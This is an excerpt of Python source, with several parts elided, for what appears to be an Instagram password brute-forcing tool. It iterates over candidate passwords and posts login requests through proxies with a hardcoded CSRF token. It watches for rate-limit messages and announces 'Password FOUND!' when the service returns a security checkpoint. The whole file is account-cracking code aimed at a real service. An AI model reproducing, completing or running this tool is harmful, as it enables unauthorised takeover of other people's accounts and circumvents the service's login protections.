import requests, time, threading, sys, json
...
class Engine():
  ...
  def passHandling(self):
    ...
    print(f"Passwords Number: {self.line}")
    print("-"*self.lineMultiplier)
    self.line += 1
    return self.p

  def loginProcedure(self):
    # Headers, Cookies, and setting the csrftoken
    session = requests.Session()
    session.headers.update(self.headers)
    session.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1','ig_vw': '1920', 'csrftoken': '',  's_network': '', 'ds_user_id': ''})
    # sea surf token
    #token = session.get(self.HOME_URL,timeout=self.fetchTime).cookies.get_dict()['csrftoken']
    session.headers.update({'X-CSRFToken': "zBmBPInIrzuVsDYEEWocPLRkHvwKVQyd"})
    # login
    ...
    self.loginInfo = session.post(self.LOGIN_URL, data=login_data, proxies=self.proxies, allow_redirects=True, timeout=self.fetchTime)
  ...
  def getError(self):
    ...
    if "message" in self.response:
      if self.response["message"] == "Please wait a few minutes before you try again.":
        ...
        return None
      #check point
      if self.response["message"] == "checkpoint_required":
        print(f"""\n
  [+] Password FOUND!
...
Script ended at: {time.ctime()}
  ...
  \n""")
        sys.exit()
    #bad pass
    if  "authenticated" in self.response:
      # no pass match
